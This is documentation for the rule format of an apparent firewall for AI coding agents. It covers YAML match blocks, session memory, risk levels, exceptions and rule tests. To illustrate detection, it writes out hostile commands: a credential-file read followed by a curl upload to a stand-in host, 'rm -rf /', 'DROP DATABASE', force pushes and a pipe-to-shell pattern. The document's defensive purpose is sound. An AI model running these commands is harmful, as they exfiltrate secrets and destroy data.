# Policy rules

This document explains the rule format of the Agent Firewall, the risk model
behind the built-in rules, and the steps to write and to test a rule.

The policy engine is the crate `af-policy`. It is deterministic: it uses no
model, no network, no clock and no random number. The same action always gets
the same verdict.

---

## 1. Where rules come from

| Source | How to load it |
| --- | --- |
| The pack inside the program | `PolicySet::builtin()` |
| A file or a directory | `PolicySet::load(&paths, include_builtin)` |
| Text in memory | `PolicySet::from_str(text, "name")` |

`load` reads a directory one level deep and takes every `*.yaml` and `*.yml`
file, in name order. The order of the files never changes a verdict.

The built-in files are in `policies/` in the source tree. The program holds a
copy of them, so the firewall also works with no rule file on disk.

A rule of a local file **replaces** a built-in rule with the same identifier.
Two local files with the same identifier are a load error.

---

## 2. The rule file

```yaml
version: 1                        # must be 1
name: builtin.database            # name of the pack
description: What the pack does.  # one line
rules:
  - id: database.destructive.drop-database
    title: Drop of a whole database
    category: database
    risk: approval_required       # info | low | suspicious | approval_required | blocked
    decision: approval_required   # allow | allow_once | allow_session | approval_required | deny | terminate
    reason: The command removes a whole database and all of its data.
    references: ["https://example.com/why"]   # optional
    enabled: true                             # optional, default true
    match: { ... }                            # the condition
    exceptions: [ { ... } ]                   # optional, switches the rule off
    remember: { ... }                         # optional, writes a mark down
    threshold: { ... }                        # optional, a count over a window
    tests: [ { ... } ]                        # examples that prove the rule
```

Every structure refuses an unknown field. A typo is a load error and never a
silent hole in the protection.

### Rule fields

| Field | Type | Meaning |
| --- | --- | --- |
| `id` | text | Stable identifier. It must be unique in the whole set. |
| `title` | text | Short name for the user interface. |
| `category` | text | Group of the rule, for example `git` or `database`. |
| `risk` | level | How dangerous the action is. See section 4. |
| `decision` | decision | What the firewall must do. See section 4. |
| `reason` | text | Why the rule matched. The user reads this text. |
| `references` | list of text | Links that explain the danger. Use `http` or `https`. |
| `enabled` | bool | `false` loads the rule but never uses it. |
| `match` | match block | The condition of the rule. See section 3. |
| `exceptions` | list of match blocks | Any hit switches the rule off. See section 5. |
| `remember` | remember block | Writes a mark for a later rule. See *Session memory* below. |
| `threshold` | threshold block | A count over a window. The rule is quiet below it. See *Session memory* below. |
| `tests` | list of tests | Examples that prove the rule. See section 6. |

---

## 3. The match block

All fields are optional. Every field that you write must hold. This is an
implicit **and**.

### Which action the rule looks at

| Field | Value | Meaning |
| --- | --- | --- |
| `action` | `exec` | A program starts. |
| `action` | `file_open` | A process opens a file. |
| `action` | `network_connect` | A process opens a connection. |
| `action` | `input` | The monitor captured a script, a standard input stream or another text. |

Some fields only work with one action kind. The lint reports a rule that mixes
them, because such a rule can never match.

### Program and command line (`exec`)

| Field | Type | Meaning |
| --- | --- | --- |
| `program` | list | The program name must be one of the list. The compare is exact and it looks at upper and lower case. |
| `exe_glob` | list | The full path of the program must match one pattern. `*` stays inside one path part, `**` steps over path parts, `?` is one character. |
| `argv_contains` | list | Every entry of the list must be an argument. |
| `argv_any` | list | At least one entry of the list must be an argument. |
| `argv_matches` | regex | The pattern must match the arguments, joined with one space. |
| `argv_not_matches` | regex | The pattern must **not** match the joined arguments. |
| `cwd_prefix` | list | The working directory must start with one of the prefixes. |
| `cwd_not_prefix` | list | The working directory must start with none of the prefixes. |
| `env` | map | For every entry, the process must have the variable and the value must match the pattern. An empty pattern only asks for the name. |

`program` also matches the program name of the process, so a rule finds the
command in an `exec` action and in a file action of the same process.

### File (`file_open`)

| Field | Type | Meaning |
| --- | --- | --- |
| `path` | list | The path must be exactly one of the list. |
| `path_prefix` | list | The path must start with one of the prefixes. |
| `path_glob` | list | The path must match one glob pattern. |
| `path_matches` | regex | The pattern must match the path. |
| `write` | bool | `true` selects a write, `false` selects a read. |

### Connection (`network_connect`)

| Field | Type | Meaning |
| --- | --- | --- |
| `host` | list | The host name must be one of the list. Without a host name, the address takes its place. |
| `host_matches` | regex | The pattern must match the host name or the address. |
| `port` | number | The port must be this number. |
| `port_in` | list of numbers | The port must be one of the list. |

### Captured content (`input`)

| Field | Type | Meaning |
| --- | --- | --- |
| `input_matches` | regex | The pattern must match the captured text. |

The monitor sends a script file, a standard input stream or the text of a
here-document as an `input` action. A rule that must find `DROP DATABASE` in a
command line **and** in a script writes two branches under `any_of`, one with
`action: exec` and one with `action: input`.

### The process tree

| Field | Type | Meaning |
| --- | --- | --- |
| `parent_program` | list | The nearest parent must be one of the list. |
| `ancestor_program` | list | Any process between the action and the start of the session must be one of the list. |
| `ancestor_depth_at_least` | number | How many processes sit between the action and the start of the session. |

### Groups

| Field | Type | Meaning |
| --- | --- | --- |
| `not` | match block | The block must **not** match. |
| `all_of` | list of match blocks | Every block must match. |
| `any_of` | list of match blocks | At least one block must match. |

A group can hold a group, so you can build any condition.

### Session memory

The blocks above look at one action. Four more blocks let a rule look at the
whole session. The engine keeps the memory, and the launcher writes it. Read
section 6 of `ARCHITECTURE.md` for the flow.

Every time in this section is the time of the **event**, never the clock of
the machine. A replay of a trace therefore gives the same answer as the live
session.

#### `remember` — write a fact down

A rule field, next to `match`. When the condition of the rule matches, the
session writes the mark down.

| Field | Type | Meaning |
| --- | --- | --- |
| `mark` | text | Name of the mark. It may not be empty. |
| `scope` | `session` or `subtree` | How far the mark reaches. The default is `session`. |
| `ttl_seconds` | number | How long the mark counts. Without a value it counts for the whole session. |

`scope: subtree` ties the mark to the process under the root of the session,
so a fact of one agent task cannot arm a rule in another task.

A rule may exist only to remember. Give it `risk: info` and
`decision: allow`, and it stays quiet.

```yaml
  - id: memory.credentials.read-mark
    risk: info
    decision: allow
    match: { action: exec, program: [cat], argv_matches: '\.aws/credentials' }
    remember: { mark: credential-read, scope: subtree, ttl_seconds: 600 }
```

#### `marked` — ask about the fact

A match field. It holds when a live mark of that name is visible.

| Field | Type | Meaning |
| --- | --- | --- |
| `mark` | text | Name of the mark. |
| `within_seconds` | number | How old the mark may be. Without a value, any age counts. |
| `scope` | `session` or `subtree` | `subtree` also asks for the same process subtree. The default is `session`. |

A mark that a rule wrote with `scope: subtree` is invisible outside that
subtree, whatever the reader asks for.

```yaml
    match:
      action: exec
      marked: { mark: credential-read, within_seconds: 600, scope: subtree }
      argv_matches: '(?:^|\s)curl(?:\s|$)'
```

The lint reports a `marked` block whose name no loaded rule writes. That is
an error, because such a rule can never match.

#### `threshold` — a count over a window

A rule field, next to `match`. The rule counts every time its condition
matches, and it **fires only when the window holds enough hits**. Below the
count it stays quiet and writes nothing to the user.

| Field | Type | Meaning |
| --- | --- | --- |
| `window_seconds` | number | Length of the trailing window. It must be more than 0. |
| `at_least` | number | How many hits the window must hold, this action included. It must be at least 2. |
| `distinct` | `none`, `path`, `host`, `program` or `argv_joined` | What makes two hits different. The default is `none`, which counts every hit. |

With `distinct`, the rule counts the **different values** and not the hits. An
action that carries no such value adds nothing to the count.

```yaml
    # Twenty deletes in one minute.
    threshold: { window_seconds: 60, at_least: 20 }

    # Three different credential files in five minutes.
    threshold: { window_seconds: 300, at_least: 3, distinct: path }
```

`distinct: path` needs `action: file_open` and `distinct: host` needs
`action: network_connect`. The lint reports the other combinations, because
they can never count.

A rule with a `threshold` fires again on every hit once the window holds
enough of them, and a runaway loop can cross that line hundreds of times. The
firewall asks one time for a threshold rule. The answer holds for the
session, so the other hits of the same burst stay quiet instead of asking the
same question again and again.

#### `baseline_missing` — is the value new?

A match field. The launcher records named sets of text at session start. This
block reads a value out of the joined command line and asks whether the set
holds it.

| Field | Type | Meaning |
| --- | --- | --- |
| `set` | text | Name of the baseline set, for example `git_remotes`. |
| `capture` | regex | Pattern with **exactly one** group. The group is the value. |

The block holds only when the pattern captures a value **and** the set does
not hold it. Two cases give no match:

* the pattern captures nothing;
* the session recorded no set with that name. An unknown set would make every
  value look new, and a rule that fires on everything is worse than a rule
  that is quiet.

A pattern without exactly one group is a load error.

The launcher of this version records one set: `git_remotes`, which holds the
name and the address of every git remote of the work tree. A directory that
is not a repository gives an empty set, and then every remote is new.

```yaml
    match:
      action: exec
      program: [git]
      all_of:
        - argv_matches: '(?:^|\s)push(?:\s|$)'
        - baseline_missing:
            set: git_remotes
            capture: '(?:^|\s)push(?:\s+-{1,2}\S+)*\s+([^\s-]\S*)'
```

### Regular expressions

The engine uses the `regex` crate. It has no look-around, because it always
runs in linear time. Use `argv_not_matches` or `not` in place of a negative
look-ahead.

Write a pattern in single quotes in YAML, so a backslash stays a backslash:

```yaml
argv_matches: '(?:^|\s)push(?:\s|$)'
```

Every pattern compiles one time, at load. A bad pattern is a load error with
the file, the rule identifier and the field in the message. At run time the
engine only reads; it joins the command line one time for each action and it
allocates nothing more. A held process waits for this answer.

---

## 4. The risk model

### The two ladders

`risk` says how dangerous the action is. `decision` says what happens now.

| `risk` | Meaning |
| --- | --- |
| `info` | A normal step. The rule only writes a note. |
| `low` | A small risk. |
| `suspicious` | The step is worth a look, but it does not stop work. |
| `approval_required` | The step needs a person. |
| `blocked` | The step must never run. |

| `decision` | Meaning |
| --- | --- |
| `allow` | The action continues. |
| `allow_once` | The action continues one time. |
| `allow_session` | The action continues for the whole session. |
| `approval_required` | The process waits for the answer of the user. |
| `deny` | The action fails. |
| `terminate` | The session ends. |

### How the verdict is built

The engine tries every rule. It then calls `Verdict::from_matches`, which
takes the **strongest** decision and the **highest** risk of all rules that
matched. The list of matches is sorted, strongest first.

Two results follow from this:

1. **A rule that matches nothing is quiet.** No match means allow. You do not
   need an `allow` rule for a normal command.
2. **A later `allow` rule cannot make a `deny` rule weak.** If one rule says
   `deny` and another says `allow`, the answer is `deny`. Order does not help,
   because the engine takes the maximum, not the last hit. To make a rule
   quiet for one case, use `exceptions` (section 5).

### When a rule may ask for approval

Every question costs the trust of the user. Section 8 of `PROJECT.md` says it
directly: too many questions make people switch the protection off. A firewall
that nobody uses protects nobody.

The rule for the built-in pack is:

> A rule uses `approval_required` or `deny` only when the action destroys data
> or infrastructure **and** the user has no simple way back.

Use this table:

| Question | Answer | Level |
| --- | --- | --- |
| Can `git reflog`, a new build or a `revert` bring the state back? | yes | `suspicious` with `allow` |
| Does only a backup bring the data back? | yes | `approval_required` |
| Does the action reach real users of the product? | yes | `approval_required` |
| Does any development task need this? | no | `blocked` with `deny` |

Examples from the built-in pack:

- `git branch -D old` is `suspicious`: the reflog still holds the commits.
- `git reset --hard` is `approval_required`: changes that are not committed
  have no copy anywhere.
- `kubectl delete pod api-7` is `suspicious`: a controller starts it again.
- `kubectl delete pvc postgres-data` is `approval_required`: the data of the
  volume is gone.
- `rm -rf /` is `blocked`: no development task needs it.

The `allowlist.yaml` file holds rules with `risk: info`. They do not make a
strong decision weak. They write a note that the firewall saw a known safe
form of a command that looks dangerous. Use them for a report, and use
`exceptions` when you really want a rule to stay quiet.

---

## 5. Exceptions

An `exceptions` list holds match blocks. If one of them matches, the rule does
**not** produce a match, even when the condition of the rule holds.

```yaml
  - id: git.push.force
    risk: approval_required
    decision: approval_required
    reason: A force push writes over the history of the remote branch.
    match:
      action: exec
      program: [git]
      all_of:
        - argv_matches: '(?:^|\s)push(?:\s|$)'
        - argv_matches: '(?:^|\s)(?:--force|-f)(?:\s|$)'
      argv_not_matches: '--force-with-lease'
    exceptions:
      - argv_any: ["--dry-run", "-n"]
```

`git push --force --dry-run origin main` writes nothing, so the exception
keeps the rule quiet.

An exception with no condition is a load-time lint error, because it would
switch the rule off for every action.

Three ways to make a rule narrow, from the most local to the widest:

1. `argv_not_matches` or `not` inside the `match` block. Use it when the case
   belongs to the condition itself.
2. `exceptions`. Use it when a whole class of actions is safe, for example a
   dry run or a local cluster.
3. `enabled: false` in a local file with the same rule identifier. Use it when
   a team does not want the rule at all.

---

## 6. Tests inside a rule file

Every rule carries its own examples. `PolicySet::run_tests()` runs them and
the command line tool shows the report. A test runs **against its own rule
only**, so another rule cannot hide a mistake.

```yaml
    tests:
      - name: a psql drop needs approval
        expect: approval_required        # the decision that the rule must give
        expect_match: true               # optional, see below
        process:
          pid: 100
          comm: psql
          exe: /usr/bin/psql
          argv: [psql, -c, "DROP DATABASE customer_prod"]
          cwd: /home/dev/app
          env: { PGHOST: prod-db.internal }
        ancestry: [{ comm: bash }, { comm: claude }]
```

| Field | Meaning |
| --- | --- |
| `name` | What the example proves. |
| `expect` | The decision that the rule must give. `allow` means "the rule stays quiet". |
| `expect_match` | Does the rule have to match? The default is `expect != allow`. |
| `process` | The process of the action. Only `pid`, `ppid`, `exe`, `comm`, `argv`, `cwd` and `env` exist, and all of them have a default. |
| `ancestry` | The parents, nearest parent first, session root last. |
| `file_open` | `{ path: ..., write: true }` makes a file action. |
| `connect` | `{ host: ..., addr: ..., port: 5432 }` makes a connection action. |
| `input` | `{ source: stdin, data: "..." }` makes a captured content action. |
| `history` | The steps that happened before. See below. |
| `at_seconds` | Time of the action, in seconds after the start of the test. |
| `baseline` | The named sets of the session start, for example `{ git_remotes: [origin] }`. |

Without `file_open`, `connect` or `input`, the test builds an `exec` action
from the `process` block. A test with more than one action is a load error.

### A test with a history

A rule that reads the session memory needs more than one action. The
`history` list holds the steps that came first. A step has the same shape as
the action of a test, and it takes three more fields:

| Field | Meaning |
| --- | --- |
| `at_seconds` | Time of the step. Without it, the steps stand one second apart. |
| `repeat` | How many times the step happens, one second apart. The default is 1. |
| `ancestry` | The parents of the step, as in the test itself. |

The harness plays every step through the whole loaded pack and keeps what the
rules write, because a mark often comes from another rule. It then judges the
action of the test **against its own rule only**, exactly as a test without a
history.

```yaml
    tests:
      - name: an upload after a credential read needs approval
        expect: approval_required
        history:
          - process: { comm: cat, argv: [cat, /home/dev/.aws/credentials] }
            ancestry: [{ comm: bash }, { comm: claude }]
        process: { comm: curl, argv: [curl, -T, out.txt, "https://drop.example/u"] }
        ancestry: [{ comm: bash }, { comm: claude }]

      - name: twenty deletes in one minute need approval
        expect: approval_required
        history:
          - repeat: 19
            process: { comm: rm, argv: [rm, -f, build/tmp.o] }
        process: { comm: rm, argv: [rm, -f, build/tmp.o] }
```

Write both halves of a chain as two tests: one that fires, and one for each
half alone that must stay quiet.

### `expect_match` and quiet rules

A rule with `decision: allow` gives the decision `allow` whether it matches or
not. A test with `expect: allow` alone therefore proves nothing for such a
rule. Write `expect_match: true` for the positive example:

```yaml
    tests:
      - name: a push to the main branch is reported
        expect: allow
        expect_match: true                       # the rule must match
        process: { pid: 1, comm: git, argv: [git, push, origin, main] }
      - name: a push to a feature branch stays quiet
        expect: allow                            # expect_match is false here
        process: { pid: 2, comm: git, argv: [git, push, origin, feature/x] }
```

The lint reports a rule with no test, and also a rule whose tests never make
it match.

---

## 7. How to write a rule

1. **Write the command down.** Take the exact command line that you want to
   find, and two command lines that look like it but are safe.
2. **Choose the category and the identifier.** The identifier reads
   `category.group.thing`, for example `database.destructive.truncate`.
3. **Choose the risk and the decision** with the table of section 4. When in
   doubt, take `suspicious` with `allow`. A quiet rule that reports is worth
   more than a question that people learn to click away.
4. **Write the condition.** Start with `program` and one `argv_matches`. Add
   `all_of` for the parts that must all hold, and `any_of` for the forms of
   the same command.
5. **Write the reason.** The user reads this line under time pressure. Say
   what the command destroys, not which pattern matched.
6. **Write the tests.** At least one example that must match. For every rule
   that can misfire, one example of a normal command that must stay quiet.
7. **Run the tests**:

   ```sh
   cargo test -p af-policy
   ```

8. **Read the lint.** `PolicySet::lint()` reports a rule that can never match,
   a rule with no test and a risk level that does not fit the decision.

### Patterns that the built-in pack uses

The command line is joined with one space, so `argv_matches` sees
`git push --force origin main`.

| Goal | Pattern |
| --- | --- |
| A word as a whole argument | `'(?:^\|\s)push(?:\s\|$)'` |
| A short flag inside a group of flags, for example `-rf` | `'(?:^\|\s)-[a-zA-Z]*f[a-zA-Z]*(?:\s\|$)'` |
| A word in SQL, in any case | `'(?i)\bdrop\s+database\b'` |
| A pipe into an interpreter | `'\|\s*(?:sudo\s+)?(?:sh\|bash\|python3?)\b'` |
| Not this flag | put `argv_not_matches: '--force-with-lease'` next to the condition |

A rule that must also find the command inside `sudo`, `sh -c` or `xargs` lists
those programs in `program` and asks for the real command with `argv_matches`:

```yaml
      program: [rm, sh, bash, zsh, sudo, xargs, busybox]
      all_of:
        - argv_matches: '(?:^|\s)rm(?:\s|$)'
        - argv_matches: '(?:^|\s)(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)(?:\s|$)'
```

---

## 8. The built-in pack

| File | Rules | What it protects |
| --- | --- | --- |
| `policies/filesystem.yaml` | 28 | Deletion outside the work tree, credential files, system files, disks. |
| `policies/git.yaml` | 16 | Force push, protected branches, lost work, rewritten history. |
| `policies/database.yaml` | 16 | Drop, truncate, statements with no `where`, production servers. |
| `policies/cloud.yaml` | 23 | Kubernetes, Terraform, AWS, Azure, Google Cloud, containers, Helm. |
| `policies/network.yaml` | 18 | Downloads that run at once, administration ports, reverse shells, data that leaves. |
| `policies/process.yaml` | 33 | Programs from temporary places, hidden payloads, deep shell chains. |
| `policies/memory.yaml` | 5 | Chains, bursts, sweeps and a remote that the session did not know. |
| `policies/allowlist.yaml` | 5 | Known safe forms of commands that look dangerous. |
| **Total** | **144** | |

Of the 144 rules, 9 answer `deny`, 59 answer `approval_required` and 76 stay
quiet with `allow`. The rules that stop an action only look at commands that
destroy data. A normal development session — `git status`, `cargo build`,
`npm test`, `psql -c "SELECT ..."`, `kubectl get pods` — matches no rule at
all and produces no note.

`policies/memory.yaml` is the only file whose rules need more than one
action. It holds the chain of a credential read and an upload, a burst of
deletes, a sweep over several credential stores, and a push to a remote that
the session start did not know.

---

## 9. Local rules

Put your own files in a directory and load them next to the built-in pack:

```rust
use std::path::PathBuf;
use af_policy::PolicySet;

let paths = vec![PathBuf::from("./my-rules")];
let policy = PolicySet::load(&paths, true)?;
# Ok::<(), af_core::Error>(())
```

The command line tool of the firewall does the same when it gets a policy
path.

- A rule with a new identifier is added.
- A rule with the identifier of a built-in rule replaces it. Give it
  `enabled: false` to switch the built-in rule off.
- Two of your files may not use the same identifier.

Run `PolicySet::lint()` and `PolicySet::run_tests()` on your directory before
you use it, exactly as the built-in pack does in its own test.
